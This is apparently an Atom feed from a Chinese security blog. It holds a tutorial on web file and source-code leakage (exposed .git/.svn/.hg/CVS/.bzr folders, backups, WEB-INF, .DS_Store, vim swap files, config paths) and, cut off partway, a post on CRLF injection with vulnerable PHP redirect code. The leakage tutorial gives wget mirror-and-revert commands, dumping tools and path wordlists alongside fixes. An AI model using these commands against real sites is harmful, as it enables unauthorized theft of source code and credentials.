<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HVVL404</title>
  
  
  <link href="http://blog.hvvl404.fun/atom.xml" rel="self"/>
  
  <link href="http://blog.hvvl404.fun/"/>
  <updated>2023-05-18T14:34:00.793Z</updated>
  <id>http://blog.hvvl404.fun/</id>
  
  <author>
    <name>HVVL404</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件泄露</title>
    <link href="http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>http://blog.hvvl404.fun/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2023-05-17T10:08:14.108Z</published>
    <updated>2023-05-18T14:34:00.793Z</updated>
    
    <content type="html"><![CDATA[<p>信息泄露</p><span id="more"></span><p>文件泄露介绍</p><p>提到信息泄露大家应该都不陌生了，现在有太多的信息泄露，可能在某些人眼里这已经不算什么了。但是信息泄露确是很严重的问题，这可不只泄露你一个人的信息那么简单，可能表面上只泄露你一个人的信息，实际上你全家人的信息都被扒出来了，而且泄露的信息包括你的身份证、家庭住址等敏感信息。</p><p>但是接下来会介绍的不是关于人的敏感信息，而是网站的敏感信息，就是一些重要文件泄露、源码泄露等。</p><h2 id="一、版本管理软件造成的泄露"><a href="#一、版本管理软件造成的泄露" class="headerlink" title="一、版本管理软件造成的泄露"></a>一、版本管理软件造成的泄露</h2><h3 id="1、git-泄露"><a href="#1、git-泄露" class="headerlink" title="1、git 泄露"></a>1、git 泄露</h3><p>（1）漏洞产生</p><p>Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、所有该项目的源代码</span><br><span class="line">2、私有仓库的地址</span><br><span class="line">3、私密的配置信息</span><br><span class="line">4、所有commiter的邮箱帐号信息</span><br><span class="line">5、（可能）内部的帐号和密码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>常规的利用方法就是下载整个目录, 然后用git命令回滚整个项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">2、cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：GitHack、dvcs-ripper、scrabble</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、GitHack</span><br><span class="line">github项目地址：https://github.com/lijiejie/GitHack</span><br><span class="line"></span><br><span class="line">2、dvcs-ripper：基于perl的工具，除了git还支持很多版本管理系统</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"></span><br><span class="line">3、scrabble</span><br><span class="line">github项目地址：</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、UC某业务导致敏感内部邮件信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091525</span><br><span class="line">2、高德软件多个信息泄露，影响公司安全：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094921</span><br><span class="line">3、陌陌某重要应用源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086227</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、删除.git目录。</span><br><span class="line">2、修改中间件配置进行对.git隐藏文件夹的访问。</span><br></pre></td></tr></table></figure><h3 id="2、svn-源码泄露"><a href="#2、svn-源码泄露" class="headerlink" title="2、svn 源码泄露"></a>2、svn 源码泄露</h3><p>（1）漏洞产生</p><p>svn 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为 .svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用 “导出” 功能，而是直接复制代码文件夹到 WEB 服务器上，这就使 .svn 隐藏文件夹被暴露于外网环境，可以利用 <code>.svn/entries</code> 文件，获取到服务器源码。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）所有该项目的源代码</span><br><span class="line">（2）svn仓库的地址</span><br><span class="line">（3）svn仓库所属用户的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>同样是先下载目录, 然后回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">（2）cd www.example.com &amp;&amp; svn revert --recursive</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：Seay-SVN、dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper: 支持旧版和新版的svn</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br><span class="line"> </span><br><span class="line">（2）Seay-Svn: 法师的工具，基于Windows平台</span><br><span class="line">下载地址：https://www.vuln.cn/2225</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）淘宝网某应用svn信息导致代码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-012665</span><br><span class="line">（2）新浪某服务器svn源码泄露可SQL影响海量用户数据：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0199607</span><br><span class="line">（3）中国联通整站配置不当导致SVN源码泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0169147</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）删除web目录中所有.svn隐藏文件夹。</span><br><span class="line">（2）开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。</span><br></pre></td></tr></table></figure><h3 id="3、hg-源码泄露"><a href="#3、hg-源码泄露" class="headerlink" title="3、hg 源码泄露"></a>3、hg 源码泄露</h3><p>（1）漏洞产生</p><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成 .hg 。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）项目源代码</span><br><span class="line">（2）项目仓库地址</span><br><span class="line">（3）（可能）仓库的用户名</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>手动利用，下载+回滚：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">（2）cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除.hg文件。</span><br></pre></td></tr></table></figure><h3 id="4、cvs-泄露"><a href="#4、cvs-泄露" class="headerlink" title="4、cvs 泄露"></a>4、cvs 泄露</h3><p>（1）漏洞产生</p><p>CVS 是一个 C&#x2F;S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root 以及 CVS&#x2F;Entries 目录，直接就可以看到泄露的信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为是纯客户端的工具，所以只会泄露源代码</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载CVS文件夹然后通过cvs命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理。</span><br><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">（2）cd www.example.com &amp;&amp; cvs diff \*</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）华为某系统CVS信息泄漏：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-081481</span><br><span class="line">（2）国泰君安某重要分站CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0136373</span><br><span class="line">（3）易宝支付某站多处CVS信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0109755</span><br></pre></td></tr></table></figure><p>（6）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除cvs文件。</span><br></pre></td></tr></table></figure><h3 id="5、Bazaar-x2F-bzr泄露"><a href="#5、Bazaar-x2F-bzr泄露" class="headerlink" title="5、Bazaar&#x2F;bzr泄露"></a>5、Bazaar&#x2F;bzr泄露</h3><p>（1）漏洞产生</p><p>bzr也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面，bzr在初始化项目时(bzr init&#x2F;init-repo)，会在项目根目录产生名为.bzr的隐藏目录，同样暴露了源代码和用户信息。</p><p>（2）漏洞危害（泄露内容）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）源代码</span><br><span class="line">（2）仓库地址</span><br><span class="line">（3）开发者的信息</span><br></pre></td></tr></table></figure><p>（3）漏洞利用</p><p>没用过bzr工具, 不过查询文档得知可用bzr revert命令来进行回滚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">（2）cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure><p>（4）漏洞利用工具：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）dvcs-ripper</span><br><span class="line">github项目地址：https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同git。</span><br></pre></td></tr></table></figure><h3 id="6、github-源码泄漏"><a href="#6、github-源码泄漏" class="headerlink" title="6、github 源码泄漏"></a>6、github 源码泄漏</h3><p>（1）漏洞产生</p><p>GitHub 是一个面向开源及私有软件项目的托管平台。很多人喜欢把自己的代码上传到平台托管，通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。类似的代码托管平台还有很多，人才是最大的漏洞。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+&lt;span&gt;@qq.com&lt;/span&gt;&amp;type=code</span><br></pre></td></tr></table></figure><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）咕咚网github信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0177720</span><br><span class="line">（2）一个github引发的畅捷通渗透测试：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0164337</span><br><span class="line">（3）Github Hack之环球运费网代码泄露（审计发现安全漏洞）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0152208</span><br></pre></td></tr></table></figure><h3 id="7、前端泄露"><a href="#7、前端泄露" class="headerlink" title="7、前端泄露"></a>7、前端泄露</h3><p>源代码泄露，在 ctf 中常见于签到题，一般叫你右键查看源代码就可以看到 flag 了，有时候他不让你右键，那么就按 F12 来查看，那万一 F12 也不让呢？那就在地址前加一个 <code>view-source:</code> 即可，或者是 <code>ctrl+s</code> 保存网页的前端代码到本地以文本形式打开查看。</p><p>（1）漏洞产生</p><p>由于程序员的失误导致在前端的注释没有删除，会显示在页面上。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、右键源代码查看</span><br><span class="line">2、F12 查看</span><br><span class="line">3、地址前加 view-source:</span><br><span class="line">4、ctrl+s 文本打开查看</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除注释。</p><br><h2 id="二、文件包含导致的泄露"><a href="#二、文件包含导致的泄露" class="headerlink" title="二、文件包含导致的泄露"></a>二、文件包含导致的泄露</h2><h3 id="1、网站备份压缩文件"><a href="#1、网站备份压缩文件" class="headerlink" title="1、网站备份压缩文件"></a>1、网站备份压缩文件</h3><p>（1）漏洞产生</p><p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似 tar -czvf bakup.tgz 的命令将网站进行备份, 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,  如 vim 的 .swp , 从而泄露了该网页的源代码。</p><p>（2）漏洞利用</p><p>对于打包文件而言，渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站，说不定会有意外惊喜。对于网页的临时备份文件，可以扫描对应页面的 .swp 或者 .bak 等后缀，说不定也能找到有用的信息。</p><p>（3）漏洞工具：御剑、dirsearch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）dirsearch</span><br><span class="line">github项目地址：https://github.com/maurosoria/dirsearch</span><br><span class="line"></span><br><span class="line">（2）御剑</span><br><span class="line">下载地址：https://pan.baidu.com/share/init?surl=Bn7GtWb7AStcjzVahFOjSQ?passwd=zkaq</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）广州医科大学某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0225610</span><br><span class="line">（2）起点中文网某分站备份文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0170753</span><br><span class="line">（3）奥凯航空任意用户登陆/敏感信息泄露/内部文件泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0158981</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>做好版本管理，并利用版本管理工具过滤掉这些类型的文件，同时不要直接在生产环境中修改或者添加文件。</p><p>（6）常见的压缩文件及备份文件后缀名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">压缩文件：</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar.gz</span><br><span class="line"></span><br><span class="line">备份文件后缀名：</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.swp</span><br><span class="line">.swo</span><br><span class="line">.~</span><br><span class="line">.bak</span><br><span class="line">.bash_history</span><br><span class="line">.bkf</span><br></pre></td></tr></table></figure><h3 id="2、WEB-INF-x2F-web-xml-泄露"><a href="#2、WEB-INF-x2F-web-xml-泄露" class="headerlink" title="2、WEB-INF&#x2F;web.xml 泄露"></a>2、WEB-INF&#x2F;web.xml 泄露</h3><p>（2）漏洞产生</p><p>&lt;1&gt; 在 Java 的 Servlet 文档中，说到 WEB-INF 目录“包含了所有 web 应用会用到但是不处于 web 路径中的资源”，也就是说，WEB-INF 目录下的内容是不属于公开页面的。web 应用可以通过 getResource 等 API 在 servlet 的上下文中访问到这些资源。</p><p>&lt;2&gt; 通常开发者会把许多 JSP 文件，Jar 包，Java 的类文件放在该目录下。一般目录的内容都是可以预测的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">2、WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">3、WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">4、WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">5、WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><p>（2）漏洞利用</p><p>通过 web.xml 文件推测应用组件相关类的名字，然后在 src 目录下查找代码，如果没有源代码可以直接下载 class 文件反编译即可。</p><p>（3）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）傲世堂官网WEB-INF目录文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-029022</span><br><span class="line">（2）华为官网WEB-INF目录配置文件导致信息泄露：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-022906</span><br><span class="line">（3）某政府网站WEB-INF目录读取到Getshell：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-068399</span><br></pre></td></tr></table></figure><p>（4）漏洞修复</p><p>发布前确认WEB-INF目录是禁止访问的, 或者在server设置好对于的过滤规则。</p><h3 id="3、DS-Store-文件泄露"><a href="#3、DS-Store-文件泄露" class="headerlink" title="3、DS_Store 文件泄露"></a>3、DS_Store 文件泄露</h3><p>（1）漏洞产生</p><p>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将 .DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p>（2）漏洞利用</p><p>.DS_Store 的格式为二进制，内部数据结构为Proprietary格式，可以自行解析并递归下载所有文件，参考 lijiejie 的 ds_store_exp 。</p><p>（3）漏洞利用工具：ds_store_exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）ds_store_exp</span><br><span class="line">github项目地址：https://github.com/lijiejie/ds_store_exp</span><br></pre></td></tr></table></figure><p>（4）漏洞案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）西北大学SQL注入+DS_Store信息泄露+git信息泄露+HP打印机未授权访问：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0167033</span><br><span class="line">（2）Camera360多各分站服务器配置不当导致未授权访问（DS_Store泄密）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-095996</span><br><span class="line">（3）TCL某网站DS_Store文件泄露敏感信息（谨慎使用Mac系统）：https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-091869</span><br></pre></td></tr></table></figure><p>（5）漏洞修复</p><p>使用 macOS 开发的同学，可以把 .DS_Store 加入忽略列表中(如 .gitignore )，但本质上其只是泄露目录结构，就算删掉 .DS_Store ，文件也依然存在于 web 服务器可以访问得到的地方，所以治本的方法还是不要将敏感信息放在 web 路径中。</p><h3 id="4、Vim-文件泄露"><a href="#4、Vim-文件泄露" class="headerlink" title="4、Vim 文件泄露"></a>4、Vim 文件泄露</h3><p>（1）漏洞产生</p><p>swp 即 swap 文件，在用 vim 编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果第一次意外退出就会保留，文件名为 .filename.swp；第二次意外退出就会生成文件名为 .filename.swo 的文件。</p><p>（2）漏洞利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接访问 .swp 文件，下载回来后删掉末尾的.swp，获得源码文件。</span><br><span class="line"></span><br><span class="line">2、直接访问 .swo 文件，下载回来后删掉末尾的.swo，获得源码文件。</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>删除 .swp 或者是 .swo 文件。</p><br><h2 id="三、配置文件的泄露"><a href="#三、配置文件的泄露" class="headerlink" title="三、配置文件的泄露"></a>三、配置文件的泄露</h2><h3 id="1、配置文件泄露"><a href="#1、配置文件泄露" class="headerlink" title="1、配置文件泄露"></a>1、配置文件泄露</h3><p>（1）漏洞产生</p><p>现代WEB开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的。</p><p>（2）漏洞利用</p><p>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好常见的配置文件路径，如 wordpress 的 <code>/wp-config.php</code> 等，组织成字典然后用脚本进行批量测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以参考猪猪侠的字典：https://github.com/ring04h/weakfilescan/blob/b1a3066e3fdcd60b8ecf635526f49cb5ad603064/dict/configfile.lst</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>修改配置文件的默认路径，同时在服务器端阻止对这些路径的访问。</p><h3 id="2、配置错误导致的泄露"><a href="#2、配置错误导致的泄露" class="headerlink" title="2、配置错误导致的泄露"></a>2、配置错误导致的泄露</h3><p>（1）Windows IIS&#x2F;Apache 目录穿越</p><p>&lt;1&gt; 漏洞原理：目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的 <code>../</code> 之类的目录跳转符，导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件。虽然 web 服务器本身会禁止访问 web 文件夹以外的地方，但如果是智障开发引入的动态页面，又没有过滤好用户输入，就可能会出现穿越甚至目录遍历。甚至 web 服务器本身也曾经有类似的漏洞，比如 Apache Tomcat 的 UTF-8 解析漏洞，具体利用和绕过可以参考其他网上的文章，这里限于篇幅就不展开了。<br>&lt;2&gt; 文章地址：<a href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a></p><p>（2）Nginx配置安全</p><p>&lt;1&gt; 漏洞原理：Nginx 的配置选项之多，并不是所有人都能熟悉，但不表示随便百度一下复制粘贴就配置了，最好还是先看下官方文档对应选项的作用和用法，可以避免许多致命的错误。例如 Nginx 在代理静态文件时，如果不小心在配置文件中写错了一个字符：location &#x2F;static {alias  &#x2F;home&#x2F;web&#x2F;static&#x2F;;}，就会导致访问 <code>http://example.com/static../</code> 时可以访问上级目录，从而访问到敏感的信息。关于 nginx 配置安全，离别歌的这篇文章其实写得很不错，值得每个开发和运维人员仔细了解。<br>&lt;2&gt; 文章地址：<a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><br><h2 id="四、默认文件泄露"><a href="#四、默认文件泄露" class="headerlink" title="四、默认文件泄露"></a>四、默认文件泄露</h2><h3 id="1、常见的默认文件泄露"><a href="#1、常见的默认文件泄露" class="headerlink" title="1、常见的默认文件泄露"></a>1、常见的默认文件泄露</h3><p>一些集成的搭建环境会存在有一些默认文件，像 XAMPP、PHPStudy等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">README.md</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure><h3 id="2、数据库文件泄露"><a href="#2、数据库文件泄露" class="headerlink" title="2、数据库文件泄露"></a>2、数据库文件泄露</h3><p>（1）数据备份文件</p><p>数据库文件是以 <code>.sql</code> 结尾，所以可以试一下网站有没有数据库文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup.sql</span><br></pre></td></tr></table></figure><p>（2）数据库文件</p><p>mdb文件是早期asp+access构架的数据库文件。一般在目录 &#x2F;db&#x2F; 下有一个 mdb 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;信息泄露&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T14:23:23.978Z</published>
    <updated>2023-05-18T14:20:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>CRLF 注入</p><span id="more"></span><h2 id="一、什么是-CRLF？"><a href="#一、什么是-CRLF？" class="headerlink" title="一、什么是 CRLF？"></a>一、什么是 CRLF？</h2><p>CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，操作系统就是根据这个标识来进行换行的，你在键盘输入回车键就是输出这个字符，只不过win和linux系统采用的标识不一样而已。</p><p>在 HTTP 当中 HTTP 的 Header 和 Body 之间就是用两个 crlf 进行分隔的，如果能控制 HTTP 消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称 HRS。CRLF 漏洞可以造成 <strong>Cookie会话固定</strong> 和 <strong>反射型XSS(可过waf)</strong> 的危害，注入XSS的利用方式：<strong>连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</strong></p><br><h2 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h2><p>HRS漏洞存在的前提是 ：url 当中输入的字符会影响到文件，比如在重定位当中可以尝试使用 <code>%0d%0a</code> 作为 CRLF。</p><p>一般网站会在HTTP头中加上 <code>Location: http://baidu.com</code> 的方式来进行 302 跳转，所以我们能控制的内容就是 Location: 后面的XXX网址，对这个地址进行污染。</p><p>假设服务端（PHP）的处理方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>(<span class="string">&quot;security_level&quot;</span>) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span 